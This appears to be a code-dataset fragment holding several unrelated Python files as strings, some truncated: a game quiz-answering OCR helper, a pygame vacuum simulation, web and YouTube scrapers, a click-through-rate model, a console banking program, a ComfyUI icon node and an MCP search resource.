    "from typing import Any, List\nimport json\nimport os\nimport sys\nimport time\n\nimport numpy as np\nimport win32api\nimport win32con\nimport win32gui\nfrom PIL import ImageGrab\nfrom PySide6.QtCore import QThread, Signal, Qt\nfrom PySide6.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QTextEdit, \\\n    QSizePolicy, QLabel\nfrom PySide6.QtGui import QIcon\nfrom fuzzywuzzy import process\nfrom paddleocr import PaddleOCR\n\n\nclass WindowHandler:\n    def __init__(self):\n        self.window = None\n        self.window_title = \"\u54b8\u9c7c\u4e4b\u738b\"\n        self.find_window()\n\n    def find_window(self):\n        def callback(hwnd, extra):\n            if self.window_title in win32gui.GetWindowText(hwnd):\n                self.window = hwnd\n                return False\n            return True\n\n        win32gui.EnumWindows(callback, None)\n        if not self.window:\n            raise Exception(f\"\u672a\u627e\u5230{self.window_title}\u7a97\u53e3\")\n\n    def capture_screenshot_ext(self, left, top, right, bottom):\n        try:\n            self.find_window()\n            try:\n                if self.window and win32gui.IsWindow(self.window):\n                    placement = win32gui.GetWindowPlacement(self.window)\n                    if placement[1] == win32con.SW_SHOWMINIMIZED:\n                        win32gui.ShowWindow(self.window, win32con.SW_RESTORE)\n                    win32gui.SetForegroundWindow(self.window)\n                    time.sleep(0.1)\n            except:\n                pass\n\n            screenshot = ImageGrab.grab(bbox=(left, top, right, bottom))\n            return np.array(screenshot)\n\n        except Exception as e:\n            print(f\"\u622a\u56fe\u5931\u8d25: {e}\")\n            return np.zeros((bottom - top, right - left, 3), dtype=np.uint8)\n\n\nclass WinOperator:\n    def __init__(self, window):\n        self.window = window\n\n    def click(self, x, y):\n        \"\"\"\n        \u5728\u6307\u5b9a\u5750\u6807\u53d1\u9001\u70b9\u51fb\u6d88\u606f\uff0c\u4e0d\u79fb\u52a8\u9f20\u6807\n        \"\"\"\n        try:\n            # \u786e\u4fdd\u7a97\u53e3\u662f\u6fc0\u6d3b\u7684\n            if self.window and win32gui.IsWindow(self.window):\n                # \u5c06\u5750\u6807\u8f6c\u6362\u4e3a\u7a97\u53e3\u5ba2\u6237\u533a\u5750\u6807\n                left, top, right, bottom = win32gui.GetWindowRect(self.window)\n                x = x - left\n                y = y - top\n\n                # \u5c06\u5750\u6807\u6253\u5305\u6210LPARAM\n                lParam = win32api.MAKELONG(x, y)\n\n                # \u53d1\u9001\u9f20\u6807\u6d88\u606f\n                win32gui.SendMessage(self.window, win32con.WM_LBUTTONDOWN, win32con.MK_LBUTTON, lParam)\n                time.sleep(0.1)\n                win32gui.SendMessage(self.window, win32con.WM_LBUTTONUP, win32con.MK_LBUTTON, lParam)\n                # print(f\"\u5df2\u53d1\u9001\u70b9\u51fb\u6d88\u606f\u5230\u5750\u6807: ({x}, {y})\")\n                return True\n            else:\n                print(\"\u65e0\u6548\u7684\u7a97\u53e3\u53e5\u67c4\")\n                return False\n\n        except Exception as e:\n            print(f\"\u70b9\u51fb\u64cd\u4f5c\u5931\u8d25: {e}\")\n            return False\n\n\nclass Ocr:\n    def __init__(self) -> None:\n        self.ocr = PaddleOCR(show_log=False)\n        self.data = None  # \u5b58\u50a8OCR\u8bc6\u522b\u7ed3\u679c\n\n    def do_ocr_ext(self, img_data, simple=False) -> List:\n        data = self.ocr.ocr(img_data, cls=False)[0]\n        if simple: return self.get_all_text(data)\n        self.data = data\n        return data\n\n    def get_all_text(self, data: List[List[Any]] = None, position=False):\n        \"\"\"\n        \u8fd4\u56de\u6240\u6709\u6587\u672c\u53ca\u5176\u4f4d\u7f6e\n\n        \u53c2\u6570:\n        data (List[List[Any]]): OCR\u8bc6\u522b\u7ed3\u679c\u7684\u6570\u636e\u3002\n\n        \u8fd4\u56de:\n        None\n        \"\"\"\n        data = data if data else self.data\n        res = []\n        if data is None: return res\n        for item in data:\n            text = str(item[1][0])  # \u786e\u4fdd text \u662f\u5b57\u7b26\u4e32\u7c7b\u578b\n            points = item[0]\n            res.append((text, points) if position else text)\n        return res\n\n\nclass ConsoleOutput:\n    def __init__(self, text_edit):\n        self.text_edit = text_edit\n\n    def write(self, text):\n        # \u4f7f\u7528 Signal \u5728\u4e3b\u7ebf\u7a0b\u4e2d\u66f4\u65b0 UI\n        if hasattr(self.text_edit, 'append_text'):\n            self.text_edit.append_text.emit(text.rstrip())\n        else:\n            self.text_edit.append(text.rstrip())\n\n    def flush(self):\n        pass\n\n\nclass SafeTextEdit(QTextEdit):\n    append_text = Signal(str)\n\n    def __init__(self):\n        super().__init__()\n        self.append_text.connect(self.append)\n        self.setReadOnly(True)\n        # \u8bbe\u7f6e\u6700\u5927\u884c\u6570\u9650\u5236\uff0c\u907f\u514d\u5185\u5b58\u5360\u7528\u8fc7\u5927\n        self.document().setMaximumBlockCount(1000)\n\n\nclass WorkerThread(QThread):\n    finished = Signal()\n    error = Signal(str)\n\n    def __init__(self, worker):\n        super().__init__()\n        self.worker = worker\n        self.is_running = True\n\n    def run(self):\n        try:\n            self.worker.run()\n        except Exception as e:\n            self.error.emit(str(e))\n        finally:\n            self.finished.emit()\n\n    def stop(self):\n        if self.worker:\n            self.worker.stop()\n        self.is_running = False\n\n\nclass MainWindow(QMainWindow):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"\u81ed\u54b8\u9c7c\u7b54\u9898\u52a9\u624bv1.0\")\n        # \u8bbe\u7f6e\u7a97\u53e3\u56fe\u6807\n        icon_path = os.path.join(os.path.dirname(__file__), \"icon.ico\")\n        if os.path.exists(icon_path):\n            self.setWindowIcon(QIcon(icon_path)",
    "import pygame\nimport sys\nimport random\n\n# Initialize Pygame\npygame.init()\n\n# Set up the game window\nwidth, height = 800, 800\nscreen = pygame.display.set_mode((width, height))\npygame.display.set_caption('Vacuum World Problem')\n\n# Set up the game clock\nclock = pygame.time.Clock()\n\n# Load images\nclean_image = pygame.image.load('clean.png')\ndirty_image = pygame.image.load('dirty.png')\nvacuum_image = pygame.image.load('vacuum.png')\n\n# Resize images to fit the grid cells\ngrid_size = 10\ncell_size = width // grid_size\nclean_image = pygame.transform.scale(clean_image, (cell_size, cell_size))\ndirty_image = pygame.transform.scale(dirty_image, (cell_size, cell_size))\nvacuum_image = pygame.transform.scale(vacuum_image, (cell_size, cell_size))\n\nclass Environment:\n    def __init__(self, grid_size):\n        self.grid_size = grid_size\n        self.grid = self.generate_grid()\n\n    def generate_grid(self):\n        grid = [[random.choice([0, 1]) for _ in range(self.grid_size)] for _ in range(self.grid_size)]\n        # Ensure at least one dirty cell\n        x, y = random.randint(0, self.grid_size - 1), random.randint(0, self.grid_size - 1)\n        grid[x][y] = 1\n        return grid\n\n    def draw(self):\n        for i in range(self.grid_size):\n            for j in range(self.grid_size):\n                if self.grid[i][j] == 0:\n                    image = clean_image\n                elif self.grid[i][j] == 1:\n                    image = dirty_image\n                screen.blit(image, (j * cell_size, i * cell_size))\n\n    def is_clean(self):\n        return all(self.grid[i][j] == 0 for i in range(self.grid_size) for j in range(self.grid_size))\n\nclass Vacuum:\n    def __init__(self, env):\n        self.env = env\n        self.x = random.randint(0, env.grid_size - 1)\n        self.y = random.randint(0, env.grid_size - 1)\n        self.score = 0\n        self.visited = set()\n        self.stack = [(self.x, self.y)]\n\n    def move(self):\n        if not self.stack:\n            return\n\n        self.x, self.y = self.stack.pop()\n        self.visited.add((self.x, self.y))\n\n        if self.env.grid[self.x][self.y] == 1:\n            self.score += 1\n            self.env.grid[self.x][self.y] = 0\n\n        neighbors = self.get_neighbors(self.x, self.y)\n        for neighbor in neighbors:\n            if neighbor not in self.visited and neighbor not in self.stack:\n                self.stack.append(neighbor)\n\n        # Introduce a delay to slow down the cleaning process\n        pygame.time.delay(200)  # 200 milliseconds delay\n\n    def get_neighbors(self, x, y):\n        neighbors = []\n        if x > 0:\n            neighbors.append((x - 1, y))\n        if x < self.env.grid_size - 1:\n            neighbors.append((x + 1, y))\n        if y > 0:\n            neighbors.append((x, y - 1))\n        if y < self.env.grid_size - 1:\n            neighbors.append((x, y + 1))\n        return neighbors\n\n    def draw(self):\n        screen.blit(vacuum_image, (self.y * cell_size, self.x * cell_size))\n\ndef main():\n    env = Environment(grid_size)\n    vacuum = Vacuum(env)\n    game_over = False\n\n    while True:\n        # Handle events\n        for event in pygame.event.get():\n            if event.type == pygame.QUIT:\n                pygame.quit()\n                sys.exit()\n\n        if not game_over:\n            # Draw everything\n            screen.fill((0, 0, 0))\n            env.draw()\n            vacuum.draw()\n\n            # Display score\n            font = pygame.font.Font(None, 36)\n            score_surf = font.render(f'Score: {vacuum.score}', True, (255, 255, 255))\n            screen.blit(score_surf, (10, 10))\n\n            # Move vacuum\n            vacuum.move()\n\n            # Check if all cells are clean\n            if env.is_clean():\n                game_over = True\n\n            # Display game complete message\n            if game_over:\n                font = pygame.font.Font(None, 72)\n                text_surf = font.render('Game Complete!', True, (0, 255, 0))\n                text_rect = text_surf.get_rect(center=(width // 2, height // 2))\n                screen.blit(text_surf, text_rect)\n\n        # Update display\n        pygame.display.flip()\n        clock.tick(30)\n\nif __name__ == \"__main__\":\n    main()\n",
    "import requests\nfrom bs4 import BeautifulSoup\nimport time\nimport json\nimport re\n\n# Retry mechanism and data scraping function\ndef featch_data_with_retries(url,retries=3,delay=2):\n    \"\"\"\n    Fetches data from a url with retries in case of failure\n    \"\"\"\n    for attempt in range(retries):\n        try:\n            response=requests.get(url)\n            response.raise_for_status()\n            return response.text\n        except requests.exception.RequestException as e:\n            print(f\"Attempt {attempt + 1} Failed: {e}\")\n            if attempt < retries - 1:\n                time.sleep(delay * {attempt+1})    # exponential backoff resolution\n            else:\n                raise\n\n\n\n# Function to extract data using Beautiful soup and regular expression\ndef extract_data_from_html(html_content):\n    \"\"\"\"\n    Extracting relavent data (links containing 'python')from the html content\n    \"\"\"\n    if not html_content:\n        raise ValueError(\"HTML content is invalid or empty!!!\")\n    \n    soup=BeautifulSoup(html_content,'html.parser')\n    titles=[]\n\n    # Regular Expression to find all the links with the specific text 'python'\n    for link in soup.find_all('a',href=True):\n        title=link.get_text()\n        if re.match(r'.*python.*',title,re.IGNORECASE):   #Looking for links containing python\n            titles.append(title)\n\n    return titles\n\n\n# Function to save data to a json file\ndef save_data_to_json(data,filename=\"scraped_data.json\"):\n    \"\"\"\n    save the extrcted data to a json file\n    \"\"\"\n    try:\n        with open(filename,'w') as file:\n            json.dump(data,file,indent=4)\n        print(f\"Data has been saved to {filename}\")\n    except Exception as e:\n        print(f\"Error saving data to the file: {e}\")\n\n\n# URL TO Scrape\nurl='https://www.python.org/downloads/'\n\n# Fetch,Extract and Save the data \nhtml_content = featch_data_with_retries(url)\nextracted_data = extract_data_from_html(html_content)\nsave_data_to_json(extracted_data)",
    "# -*- coding: UTF-8 -*-\n# @Author : Jiayu Li \n# @Email  : jy-li20@mails.tsinghua.edu.cn\n\n'''\nReference:\n \tCAN: feature co-action network for click-through rate prediction.\n\tBian, Weijie, et al. \n  \tProceedings of the fifteenth ACM international conference on web search and data mining. 2022.\n'''\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport numpy as np\nimport torch.nn.functional as fn\nimport pandas as pd\n\nfrom models.BaseContextModel import ContextSeqModel, ContextSeqCTRModel\nfrom models.context_seq.DIEN import *\n\nclass CANBase(DIENBase):\n\t@staticmethod\n\tdef parse_model_args_can(parser):\n\t\tparser.add_argument('--induce_vec_size',type=int,default=512,\n                      help='the size of the induce feature co-action vector')\n\t\tparser.add_argument('--orders',type=int,default=1,\n                      help='numbers of orders of the feature co-action vector')\n\t\tparser.add_argument('--co_action_layers',type=str,default='[4,4]',\n                      help='layers for the micro-MLP in co-action module')\n\t\treturn DIENBase.parse_model_args_dien(parser)\n\n\tdef _define_init(self, args, corpus):\n\t\tself._define_init_dien(args, corpus)\n\t\tself.induce_vec_size = args.induce_vec_size\n\t\tself.orders = args.orders\n\t\tself.co_action_layers = eval(args.co_action_layers)\n\t\tpre_size = self.embedding_size*self.orders\n\t\tco_action_nums = 0\n\t\tfor layer_size in self.co_action_layers:\n\t\t\tco_action_nums += pre_size*layer_size + layer_size\n\t\t\tpre_size = layer_size\n\t\tassert self.induce_vec_size>=co_action_nums\n\t\tinp_shape = sum(self.co_action_layers) * ((len(self.situation_context)+1)+ 1)\n\t\tself.fcn_embedding_size = self.embedding_size*(len(self.user_context)+len(self.situation_context)+len(self.item_context))+\\\n\t\t\t\t\t\tself.gru_emb_size*3 + inp_shape\n\n\t\tself._define_params_CAN()\n\t\tself.apply(self.init_weights)\n\n\tdef _define_params_CAN(self):\n\t\tself._define_params_DIEN()\n\t\tself.item_embedding_induce = nn.Embedding(self.feature_max['item_id'], self.induce_vec_size)\n\t\tself.activation = nn.Tanh()\n\t\n\tdef forward(self, feed_dict):\n\t\titem_ids = feed_dict['item_id'] # B * item num\n\t\tuser_ids = feed_dict['user_id'] # B * item num\n\t\thistory_item_ids = feed_dict['history_item_id']\n\n\t\thislens = feed_dict['lengths'] # B\n\t\tmask = \ttorch.arange(history_item_ids.shape[1])[None,:].to(self.device) < hislens[:,None]\n\n\t\t# embedding\n\t\ttarget_emb, history_emb, user_emb, context_emb = self.get_all_embeddings(feed_dict)\n\t\titem_ids_induce = self.item_embedding_induce(item_ids)\n\t\tuser_ids_emb = self.embedding_dict['user_id'](user_ids)\n\t\titem_his_emb = self.embedding_dict['item_id'](history_item_ids)\n\n\t\t# co-action between user and item\n\t\tui_coaction = self.gen_coaction(item_ids_induce, user_ids_emb.unsqueeze(dim=1),)\n\t\t# co-cation between situation context and item\n\t\tci_coaction = []\n\t\tfor s_feature in range(len(self.situation_context)):\n\t\t\tci_coaction.append(self.gen_coaction(item_ids_induce, context_emb[:,s_feature*self.embedding_size:(s_feature+1)*self.embedding_size].unsqueeze(dim=1)))\n\t\tci_coaction = torch.cat(ci_coaction,dim=-1)\n\t\t# history co-cation layer\n\t\this_coaction = self.gen_his_coation(item_ids_induce, item_his_emb, mask)\n \t\n\t\t# dien\n\t\tdien_inp, out_dict = self._get_inp(feed_dict)\n\t\tall_coaction = torch.cat([ui_coaction,ci_coaction,his_coaction,dien_inp,],dim=-1)\n\t\tlogit = self.fcn_net(all_coaction).squeeze(dim=-1)\n\t\tout_dict['prediction'] = logit\n\t\treturn out_dict \n\n\tdef gen_coaction(self, induction, feed):\n\t\t# induction: B * item num * induce vec size; feed: B * 1 * feed vec size\n\t\tB, item_num, _ = induction.shape\n\t\tfeed_orders = []\n\t\tfor i in range(self.orders):\n\t\t\tfeed_orders.append(feed**(i+1))\n\t\tfeed_orders = torch.cat(feed_orders,dim=-1) # B * 1 * (feed vec size * order)\n\n\t\tweight, bias = [], []\n\t\tpre_size = feed_orders.shape[-1]\n\t\tstart_dim = 0\n\t\tfor layer in self.co_action_layers:\n\t\t\tweight.append(induction[:,:,start_dim:start_dim+pre_size*layer].view(B,item_num,pre_size,layer))\n\t\t\tstart_dim += pre_size*layer\n\t\t\tbias.append(induction[:,:,start_dim:start_dim+layer]) # B * item num * layer\n\t\t\tstart_dim += layer\n\t\t\tpre_size = layer\n\n\t\toutputs = []\n\t\thidden_state = feed_orders.repeat(1,item_num,1).unsqueeze(2)\n\t\tfor layer_idx in range(len(self.co_action_layers)):\n\t\t\thidden_state = self.activation(torch.matmul(hidden_state, weight[layer_idx]) + bias[layer_idx].unsqueeze(2))\n\t\t\toutputs.append(hidden_state.squeeze(2))\n\t\toutputs = torch.cat(outputs,dim=-1)\n\t\treturn outputs\n\t\t\t\n\tdef gen_his_coation(self, induction, feed, mask):\n\t\t# induction: B * item num * induce vec size; feed_his: B * his * feed vec size\n\t\tB, item_num, _ = induction.shape\n\t\tmax_len = feed.shape[1]\n\t\t\n\t\tfeed_orders = []\n\t\tfor i in range(self.orders):\n\t\t\tfeed_orders.append(feed**(i+1))\n\t\tfeed_orders = torch.cat(feed_orders,dim=-1) # B * his * (feed vec size * order)\n\n\t\tweight, bias = [], []\n\t\tpre_size = feed_orders.shape[-1]\n\t\tstart_dim = 0\n\t\tfor layer in self.co_action_layers:\n\t\t\tweight.append(induction[:,:,start_dim:start_dim+pre_size*layer].view(B,item_n",
    "account = {}\n\ndef create_account():\n    \"\"\"\n    Creates a new account by taking the user's name and initial balance.\n    \"\"\"\n    global account\n    try:\n        name = input(\"Enter your name: \")\n        initial_balance = float(input(\"Enter the initial balance: \"))\n        if initial_balance < 0:\n            print(\"Initial balance cannot be negative!\")\n            return\n        account = {\n            \"name\": name,\n            \"balance\": initial_balance,\n            \"transactions\": []\n        }\n        print(f\"Account created for {name} with an initial balance of ${initial_balance:.2f}.\")\n    except ValueError:\n        print(\"Invalid input! Please enter a valid amount.\")\n\ndef deposit():\n    \"\"\"\n    Adds the entered amount to the account's balance if the account exists.\n    \"\"\"\n    if not account:\n        print(\"No account found. Please create an account first.\")\n        return\n    try:\n        amount = float(input(\"Enter amount to deposit: \"))\n        if amount <= 0:\n            print(\"Deposit amount must be positive!\")\n            return\n        account[\"balance\"] += amount\n        account[\"transactions\"].append(f\"Deposit: ${amount:.2f}\")\n        print(f\"${amount:.2f} deposited. New balance: ${account['balance']:.2f}\")\n    except ValueError:\n        print(\"Invalid input! Please enter a valid amount.\")\n\n# Function to withdraw money\ndef withdraw():\n    \"\"\"\n    Deducts the entered amount from the account's balance if sufficient funds are available.\n    \"\"\"\n    if not account:\n        print(\"No account found. Please create an account first.\")\n        return\n    try:\n        amount = float(input(\"Enter amount to withdraw: \"))\n        if amount <= 0:\n            print(\"Withdrawal amount must be positive!\")\n            return\n        if amount > account[\"balance\"]:\n            print(\"Insufficient balance!\")\n            return\n        account[\"balance\"] -= amount\n        account[\"transactions\"].append(f\"Withdrawal: ${amount:.2f}\")\n        print(f\"${amount:.2f} withdrawn. New balance: ${account['balance']:.2f}\")\n    except ValueError:\n        print(\"Invalid input! Please enter a valid amount.\")\n\n# Function to check balance\ndef check_balance():\n    \"\"\"\n    Displays the current balance of the account.\n    \"\"\"\n    if not account:\n        print(\"No account found. Please create an account first.\")\n        return\n    print(f\"Current balance: ${account['balance']:.2f}\")\n\ndef print_statement():\n    \"\"\"\n    Displays all transactions performed on the account.\n    \"\"\"\n    if not account:\n        print(\"No account found. Please create an account first.\")\n        return\n    if not account[\"transactions\"]:\n        print(\"No transactions available.\")\n        return\n    print(f\"\\nAccount statement for {account['name']}:\")\n    for transaction in account[\"transactions\"]:\n        print(f\"- {transaction}\")\n    print(f\"Final Balance: ${account['balance']:.2f}\")\n\ndef main():\n    \n    print(\"Welcome to the Banking System!\")\n    while True:\n        print(\"\\nChoose an option:\")\n        print(\"1. Create Account\")\n        print(\"2. Deposit Money\")\n        print(\"3. Withdraw Money\")\n        print(\"4. Check Balance\")\n        print(\"5. Print Statement\")\n        print(\"6. Exit\")\n        \n        choice = input(\"Enter your choice (1-6): \")\n        \n        if choice == \"1\":\n            create_account()\n        elif choice == \"2\":\n            deposit()\n        elif choice == \"3\":\n            withdraw()\n        elif choice == \"4\":\n            check_balance()\n        elif choice == \"5\":\n            print_statement()\n        elif choice == \"6\":\n            print(\"Thank you for using the Banking System. Goodbye!\")\n            break\n        else:\n            print(\"Invalid choice. Please try again.\")\n\n# Run the program\nif __name__ == \"__main__\":\n    main()\n",
    "# \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n# \u2551                                                       \u2551\n# \u2551                 Hydra de Lerne                        \u2551\n# \u2551               All rights reserved                     \u2551\n# \u2551                  onvo.me/hydra                        \u2551\n# \u2551                                                       \u2551\n# \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\nimport requests\nimport json\nimport re\nimport aiohttp\nimport asyncio\n\nuser_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'\n\nasync def scrap(url, agent='chrome'):\n    agents = {\n        'chrome': {\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',\n            'Accept-Language': 'en-US,en;q=0.9',\n            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n        },\n        'ios': {\n            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1',\n            'Accept-Language': 'en-US,en;q=0.9',\n            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n        },\n        'android': {\n            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0',\n            'Accept-Language': 'en-US,en;q=0.9',\n            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n        }\n    }\n    headers = agents[agent]\n    response = requests.get(url, headers=headers)\n    return response\n\ndef filter_youtube(json_data):\n    core = json_data['contents']['twoColumnSearchResultsRenderer']['primaryContents']['sectionListRenderer']['contents']\n    \n    tracks = []\n    data = []\n\n    for component in core:\n        try:\n            data.extend(component.get('itemSectionRenderer', {}).get('contents', []))\n        except Exception as e:\n            print(e)\n\n    for video in data:\n        try:\n            tracks.append({\n                'api': 'youtube',\n                'id': video['videoRenderer']['videoId'],\n                'poster': video['videoRenderer']['thumbnail']['thumbnails'][0]['url'],\n                'title': video['videoRenderer']['title']['runs'][0]['text'],\n                'artist': video['videoRenderer']['ownerText']['runs'][0]['text'],\n            })\n        except Exception as e:\n            # print(e)\n            pass\n\n    return tracks\n\nasync def get_video_id(q, is_youtube):\n    try:\n        json_data = {}\n        if is_youtube:\n            # searching in youtube\n            response = await scrap_youtube(f'https://www.youtube.com/results?search_query={q}')\n            json_data = filter_youtube(response)\n        else:\n            # searching in youtube music\n            main = await request(q)\n            type_ = 'songs'\n            params = get_tracking_param(main)\n            data = await request(q, params[type_])\n            json_data = filter_youtube_search(data, type_)\n        \n        if len(json_data) == 0:\n            raise Exception('error yt')\n        return json_data[0]['id']\n    except Exception as e:\n        print(e)\n        return {'error': str(e)}\n\ndef filter_youtube_scrap(text_data):\n    yt_initial_data_regex = re.compile(r'var ytInitialData = (.*?);<\\/script>', re.S)\n    match = yt_initial_data_regex.search(text_data)\n\n    if match and match.group(1):\n        return json.loads(match.group(1))\n    else:\n        return {'error': 'no_data'}\n\ndef extract_subtitles(html):\n    yt_initial_data_regex = re.compile(r'var ytInitialPlayerResponse\\s*=\\s*(\\{.*?\\})\\s*;', re.S)\n    match = yt_initial_data_regex.search(html)\n\n    if match and match.group(1):\n        try:\n            json_string = match.group(1)\n            last_brace_index = json_string.rfind('}')\n            json_string = json_string[:last_brace_index + 1]\n            json_data = json.loads(json_string)\n            return json_data\n        except Exception:\n            return {'error': 'json_parse_error'}\n    else:\n        return {'error': 'no_data'}\n\nasync def request_subtitles(video_id, html=None):\n    try:\n        if html is None:\n            html = await scrap_youtube(f'https://www.youtube.com/watch?v={video_id}', True)\n        \n        json_data = extract_subtitles(html)\n        captions = json_data.get('captions', {}).get('playerCaptionsTracklistRenderer', {}).get('captionTracks', [{'error': 'no_captions'}])\n        url = None\n\n        if 'auto' not in captions[0].get('name', {}).get('simpleText', ''):\n            url = captions[0].get('baseUrl')\n\n        original = None\n        selected = captions[0].get('languageCode')\n\n        try:\n            for track in captions:\n                if track['languageCode'] in ['ar', 'en']:\n                    original = track['languageCode']\n                    break\n\n            ",
    "import torch\r\nimport numpy as np\r\nfrom PIL import Image, ImageDraw\r\nimport os\r\n\r\n\r\nclass ConvertToIconNode:\r\n    \"\"\"\r\n    Custom ComfyUI Node to convert an input image tensor to an icon file (ICO) while preserving the alpha channel\r\n    and applying rounded corners to the image. Also displays the saved icon image within the node.\r\n    \"\"\"\r\n\r\n    # Node metadata\r\n    @classmethod\r\n    def INPUT_TYPES(cls):\r\n        return {\r\n            \"required\": {\r\n                \"image\": (\"IMAGE\",),  # Accepts an image input tensor\r\n                \"filename\": (\"STRING\", {\"default\": \"output.ico\"}),  # Output filename base\r\n                \"size\": (\"INT\", {\"default\": 512, \"min\": 16, \"max\": 512}),  # Icon size\r\n                \"corner_radius\": (\"INT\", {\"default\": 20, \"min\": 1, \"max\": 128}),  # Corner radius for rounding\r\n            },\r\n        }\r\n\r\n    RETURN_TYPES = (\"STRING\", \"IMAGE\",)  # Return the file path and the image preview\r\n    FUNCTION = \"convert_to_icon\"  # Main function name\r\n    CATEGORY = \"Image Processing\"  # Category in ComfyUI\r\n    OUTPUT_NODE = True\r\n\r\n    def convert_to_icon(self, image, filename, size, corner_radius):\r\n        \"\"\"\r\n        Converts the input tensor image to an ICO file, preserving alpha transparency,\r\n        rounding the corners, with an incrementing filename and saving it to the 'icons' subfolder.\r\n        \"\"\"\r\n\r\n        # Convert PyTorch tensor to PIL Image\r\n        if isinstance(image, torch.Tensor):\r\n            image = image.squeeze(0).cpu().numpy()  # Remove batch dimension\r\n            image = (image * 255).astype(\"uint8\")  # Scale to 0-255 and convert type\r\n\r\n            # Ensure correct RGB or RGBA format\r\n            if image.shape[-1] == 3:  # RGB\r\n                image = Image.fromarray(image, mode=\"RGB\")\r\n            elif image.shape[-1] == 4:  # RGBA\r\n                image = Image.fromarray(image, mode=\"RGBA\")\r\n            else:\r\n                raise ValueError(\"Unsupported image format. Ensure 3 (RGB) or 4 (RGBA) channels.\")\r\n\r\n        # Resize image to specified size\r\n        image = image.resize((size, size), Image.LANCZOS)\r\n\r\n        # Apply rounded corners\r\n        image = self.apply_rounded_corners(image, corner_radius)\r\n\r\n        # Define the output folder and ensure it exists\r\n        output_folder = os.path.join(os.getcwd(), \"output\", \"icons\")\r\n        os.makedirs(output_folder, exist_ok=True)\r\n\r\n        # Generate the incrementing filename\r\n        base_filename = filename.split(\".\")[0]  # Remove the extension\r\n        extension = \".ico\"\r\n        counter = 1\r\n        output_path = os.path.join(output_folder, f\"{base_filename}_{counter}{extension}\")\r\n        while os.path.exists(output_path):  # Check if the file exists and increment if necessary\r\n            counter += 1\r\n            output_path = os.path.join(output_folder, f\"{base_filename}_{counter}{extension}\")\r\n\r\n        # Save as ICO file, preserving transparency\r\n        image.save(output_path, format=\"ICO\")\r\n\r\n        # Convert the image to NumPy array for preview\r\n        preview_image = np.array(image.convert(\"RGBA\"))  # Fixed conversion\r\n\r\n        # Return the output file path and the preview image as tensor\r\n        return output_path, torch.from_numpy(preview_image).float().div(255.0).unsqueeze(0)\r\n\r\n    def apply_rounded_corners(self, image, radius):\r\n        \"\"\"\r\n        Apply rounded corners to the image.\r\n        \"\"\"\r\n        # Create a mask for rounded corners\r\n        width, height = image.size\r\n        rounded_mask = Image.new(\"L\", (width, height), 0)\r\n        draw = ImageDraw.Draw(rounded_mask)\r\n        draw.rounded_rectangle(\r\n            (0, 0, width, height), radius, fill=255\r\n        )\r\n\r\n        # Create a new image with rounded corners using the mask\r\n        image.putalpha(rounded_mask)\r\n\r\n        # Return the image with rounded corners\r\n        return image\r\n",
    "\"\"\"\nSearch-related resources for the MCP server.\n\nImplements core MCP resource patterns for entity search:\n\nsearch://{query}\n- Searches entities by name, type, or metadata\n- Optional filtering by entity_type\n- Configurable result limit\n- Returns matching entity objects\n\nEach resource follows MCP protocol for:\n- URL pattern matching with query parameter\n- Query parameter handling for filters\n- Response formatting with pagination\n- Error handling with proper MCP error types\n\"\"\"\n\nfrom typing import List, Dict, Any\nfrom sqlalchemy import or_\nfrom sqlalchemy.orm import Session\n\nfrom mcp.server.fastmcp import FastMCP\nfrom ..db.connection import get_db\nfrom ..db.models.entities import Entity\nfrom ..utils.errors import DatabaseError\n\n\ndef register_resources(mcp: FastMCP) -> None:\n    \"\"\"Register search-related resources with the MCP server.\"\"\"\n\n    @mcp.resource(\"search://{query}/{entity_type}/{limit}\")\n    def search_entities(\n        query: str, entity_type: str, limit: int\n    ) -> List[Dict[str, Any]]:\n        \"\"\"Search entities by name, type, or metadata.\"\"\"\n        try:\n            db = next(get_db())\n            base_query = db.query(Entity)\n\n            # Apply search filters\n            search_filter = or_(\n                Entity.name.ilike(f\"%{query}%\"),\n                Entity.type.ilike(f\"%{query}%\"),\n                Entity.metadata.cast(str).ilike(f\"%{query}%\"),\n            )\n            base_query = base_query.filter(search_filter)\n\n            # Filter by type if specified\n            if entity_type:\n                base_query = base_query.filter(Entity.type == entity_type)\n\n            results = base_query.limit(limit).all()\n            return [\n                {\"id\": e.id, \"name\": e.name, \"type\": e.type, \"metadata\": e.metadata}\n                for e in results\n            ]\n        except Exception as e:\n            raise DatabaseError(f\"Search failed: {str(e)}\")\n",
